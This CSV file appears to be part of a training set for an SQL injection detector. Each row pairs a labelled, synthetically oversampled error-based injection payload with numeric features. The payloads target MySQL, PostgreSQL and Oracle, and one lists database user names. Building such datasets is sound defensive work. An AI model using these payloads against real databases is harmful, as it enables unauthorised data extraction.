id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000401,attack,error,-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,nearest_attack_euclidean,R000995,0.9446500794489039,414.7002742449922,32.52917809354134,3.413148943044142,101.58753428062403,58.23342474833074,185.82095902895475,69.05835618708268,0.24506669327255529,0.14026126374932485,0.4480763796366829,0.166595663341437,0.0,0.0,1.0,0.0,0.0,2.5291780935413426,0.0,39.52917809354134,0.0,0.0,0.0,29.52917809354134,0.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,0.5291780935413425,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.529178093541343
SMOTE_000402,attack,error,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",nearest_attack_euclidean,R000477,0.6487118683142098,270.3225525810865,36.2580613978985,3.9780839051303847,99.7419386021015,35.0,99.064491183188,36.516122795796996,0.36907409191301466,0.1295020025279106,0.3663585866254781,0.13506531893359666,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.516122795797,2.0,2.0,5.0,4.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.7419386021015013,0.2580613978984987,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000403,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000508,0.09975861092139068,313.76028281556245,37.17602828155625,4.014995172410201,109.0,55.0,114.40822625244996,35.35205656311249,0.3474491277781463,0.17531836722750502,0.3645729279404148,0.11265957705393387,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.352056563112495,0.0,0.0,6.0,5.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000404,attack,error,"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000318,0.32741248709048365,204.15079042707367,33.0,3.6704682944058145,54.07539521353684,40.0,84.207481611603,25.867913601933836,0.26474610488722533,0.19604491259397888,0.4124677393226374,0.12674124319615832,0.0,1.0,2.0,0.0,1.0,2.0,0.0,14.867913601933832,0.0,0.0,4.0,5.0,0.0,1.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.8679136019338344,0.13208639806616568,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000405,attack,error,"1%'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  '%'  =  '",nearest_attack_euclidean,R000275,0.33400373349013496,322.47634125597403,38.0,3.895109744148065,101.0,55.0,126.396951046645,40.079390209329,0.3135321066003967,0.17073530557447347,0.39149105769515047,0.12424153012997932,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.079390209329002,2.0,0.0,6.0,5.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000406,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000859,0.3121687194025434,234.13710229190218,40.084946972253626,3.909743121003458,71.25484091676087,45.0,93.3397878890145,24.54247348612681,0.3042314671783977,0.19239214182911177,0.3985163213553039,0.10486006963718664,1.0,0.0,1.0,0.0,1.0,2.0,0.0,15.542473486126813,0.0,0.0,3.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_000407,attack,error,1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,nearest_attack_euclidean,R000670,0.9139938627153331,345.1989777146318,32.0,3.3197835253600534,82.81122349598154,45.0,159.5408156639877,57.846938554662565,0.23972392951234145,0.1304362530447668,0.46223482117868697,0.1676049962642048,0.4234692773312825,0.0,0.0,0.0,0.0,2.0,0.0,32.42346927733128,0.0,0.0,0.0,22.0,0.4234692773312825,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000408,attack,error,"1  )   as oblq where 2002  =  2002 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000166,0.16266157515619203,174.5396031271565,30.439886607759007,3.8282077116190494,44.0,47.0,62.31965982327702,21.219943303879504,0.2521598414388283,0.26935255790056656,0.35691667818466205,0.12157092247594306,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.219943303879504,0.0,0.0,6.0,4.0,0.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000409,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000199,0.14288852810245686,176.94143549001276,30.94143549001277,3.6009451443447644,47.941435490012765,32.0,74.0,23.0,0.27094392585425164,0.18085111916793759,0.4182182130758556,0.12998674190195514,0.0,0.0,2.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.0,4.0,0.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.941435490012767,0.05856450998723295,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000410,attack,error,1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'mptm'  =  'mptm,nearest_attack_euclidean,R000611,0.05090980070236828,365.0304524484046,29.926396253685382,3.309865186377797,86.0,45.0,170.8832449557754,63.147207492629235,0.23561966603753998,0.1232893601359221,0.46809643182505856,0.17299454200147937,4.0,0.0,0.0,0.0,0.0,3.0,0.0,34.147207492629235,0.0,0.0,0.0,23.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000411,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0,213.0,40.0,4.192633796617524,117.0,2.0,71.0,23.0,0.5492957746478874,0.009389671361502344,0.3333333333333333,0.107981220657277,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,4.0,1.0,3.000000000000001,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000412,attack,error,-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000816,0.025993607554560937,424.95059947115146,33.012350132212134,3.482493328284715,105.0,62.0,186.95059947115146,71.0,0.24708781363995583,0.145899470911212,0.4399342890827668,0.16707842636606535,0.012350132212131548,0.0,3.0,0.0,0.0,3.0,0.0,38.987649867787866,0.0,0.0,0.0,32.0,0.012350132212131326,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000413,attack,error,"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""bfko""  =  ""bfko",nearest_attack_euclidean,R000989,0.35010378420981286,370.97872335361706,34.0,3.558962785179041,101.08317212858802,45.0,161.624758192882,63.27079303214701,0.27246139015686793,0.12132153729126444,0.4356524268555829,0.17056464569628474,0.0,4.0,0.0,0.0,0.0,2.7292069678529964,0.0,32.54158606429401,0.0,3.0,0.0,22.729206967852996,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000414,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000941,0.047516991717172476,197.0195071037284,28.019507103728387,3.4590319742919604,46.01950710372839,40.0,87.0,24.0,0.23357805395741646,0.20302568107088306,0.44158085632917066,0.12181540864252985,0.0,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,3.000000000000001,0.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0195071037283856,0.9804928962716144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000415,attack,error,"-9601'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000914,0.017864292925300035,213.0,39.0,3.796716931683951,63.0,37.0,89.0,24.0,0.29577464788732394,0.17370892018779344,0.41784037558685444,0.11267605633802817,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.0,0.0,0.0,3.0,3.000000000000001,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000416,attack,error,"-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000783,0.0009979130495900439,200.0,39.0,3.8947131742002554,63.0,37.0,79.0,21.0,0.315,0.185,0.395,0.105,0.0,0.0,1.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,3.0,3.000000000000001,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000417,attack,error,"-8838""   )    )    as xisn where 2749  =  2749 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R000782,0.23720400370581715,375.0521005038105,33.84225699891129,3.4045024075195056,85.0,56.0,171.47322900326614,62.57887150054436,0.22665448350073522,0.14932530677695496,0.457164356847442,0.16685585287486776,0.0,1.0,3.0,0.0,0.0,3.0,0.0,33.57887150054436,0.0,0.0,0.0,26.0,0.0,1.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000418,attack,error,"-5182""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000828,0.16267599948312633,215.4383162793464,39.849312722314494,3.78697400333617,63.0,37.0,90.8903781124029,24.547938166943478,0.2926739256561499,0.17188786109964363,0.4215468304013104,0.11389138284289604,0.0,1.0,1.0,0.0,1.0,1.0,0.0,16.547938166943478,0.0,0.0,3.0,3.000000000000001,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000419,attack,error,"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",nearest_attack_euclidean,R000302,0.051939288608987035,362.0,35.78574987042247,3.5661267893124635,91.0,52.0,156.0,63.0,0.2513812154696133,0.143646408839779,0.430939226519337,0.17403314917127072,4.0,0.0,1.0,0.0,0.0,3.0,0.0,32.0,0.0,0.0,1.0,24.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000420,attack,error,"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R000997,1.2846072288754136,333.7691381400439,29.11543092997806,3.174629129840544,73.32685360503291,42.76913814004388,159.55771546498903,58.11543092997806,0.21967456836979854,0.12810903613339758,0.478073897661802,0.17414249783500185,0.557715464989031,0.0,0.0,0.0,0.0,1.442284535010969,0.0,33.55771546498903,0.0,0.0,0.5577154649890308,21.44228453501097,0.557715464989031,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.4422845350109689,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.44228453501097
SMOTE_000421,attack,error,1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'yhku' like 'yhku,nearest_attack_euclidean,R000404,0.19558310220068717,374.3240256695491,31.0,3.3170410124565652,90.0,45.0,175.99202200247063,63.33200366707844,0.2405091819838839,0.12025459099194197,0.4700376023307011,0.169198624693473,4.0,0.0,0.0,0.0,0.0,2.0,0.0,35.33200366707844,0.0,0.0,0.0,22.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000422,attack,error,-8163   )    )    as cvai where 2360  =  2360 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,nearest_attack_euclidean,R000594,0.02249658036029221,376.25724025904873,31.03713798704756,3.3438658879396073,84.77717207771462,56.0,173.55434415542925,61.92572402590488,0.22530911479600316,0.1488501626841218,0.46125038406944363,0.16459033845043142,0.0,0.0,3.0,0.0,0.0,3.0,0.0,33.92572402590487,0.0,0.0,0.0,26.0,0.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000423,attack,error,"1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",nearest_attack_euclidean,R000402,0.3389573665149985,339.6711657111981,41.76126204125742,4.06175459491069,114.95495183497033,63.0,124.23873795874258,37.477475917485165,0.3383897662481794,0.18550561928619655,0.3658004041308031,0.11030421033482095,2.238737958742583,0.0,0.0,0.0,2.0,2.0,0.0,22.0,0.0,0.0,6.0,7.2387379587425835,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.11936897937129165,7.0,3.0,1.0,1.1193689793712918,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,15.119368979371291
SMOTE_000424,attack,error,"1' where 2162  =  2162 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R001019,0.3787401383423601,169.49721464254844,36.058168151187864,4.008263796975087,57.645420377969664,31.0,61.322710188984836,19.529084075593932,0.33963195328088014,0.1832363085608058,0.3619185581961236,0.11521317996219044,1.0,0.0,0.0,0.0,0.0,1.0,0.0,12.264542037796966,0.0,0.0,4.0,1.264542037796966,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.2645420377969663,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.264542037796966
SMOTE_000425,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx",nearest_attack_euclidean,R000746,0.3049998511924326,194.55731616587266,29.644268383412737,3.5902909377705026,54.0,32.0,81.84585293269814,26.711463233174534,0.2777188645006089,0.16457414192628678,0.4204508851825011,0.13725610839060318,4.0,0.0,0.0,0.0,1.0,2.0,0.0,14.71146323317453,0.0,0.0,4.0,3.000000000000001,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
